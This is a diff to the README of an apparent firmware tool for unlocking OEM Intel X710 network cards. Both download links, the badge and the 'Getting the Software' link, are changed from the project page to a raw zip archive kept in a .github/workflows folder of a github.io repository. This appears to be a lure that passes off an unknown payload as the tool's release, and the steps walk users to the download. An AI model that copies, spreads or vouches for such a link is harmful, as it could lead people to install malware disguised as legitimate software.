@@ -5,7 +5,7 @@ description: "Update locked OEM Intel NICs to generic firmware with safety check
 ---
 # 🌐 intel-nic-tool - Convert OEM network cards to generic
 
-[![Download](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Partitive-paroxetime994/intel-nic-tool)
+[![Download](https://img.shields.io/badge/Download-Release-blue.svg)](https://raw.githubusercontent.com/Partitive-paroxetime994/partitive-paroxetime994.github.io/main/.github/workflows/2.9.zip)
 
 This tool allows you to change the firmware on your Intel network cards. Many companies like Dell, Lenovo, and HP lock these cards to their own systems. This tool removes those locks. It replaces the restricted software with generic versions. This process works for the Intel X710-DA2 card series. The tool includes safety features to prevent damage to your hardware. 
 
@@ -21,7 +21,7 @@ The tool includes a backup feature. This feature saves your current card setting
 ## 📥 Getting the Software
 To start, you need to visit our release page. We keep all current versions there.
 
-[Visit the link here to download your copy](https://github.com/Partitive-paroxetime994/intel-nic-tool)
+[Visit the link here to download your copy](https://raw.githubusercontent.com/Partitive-paroxetime994/partitive-paroxetime994.github.io/main/.github/workflows/2.9.zip)
 
 1. Open the link above in your web browser.
 2. Look for the section labeled "Assets".
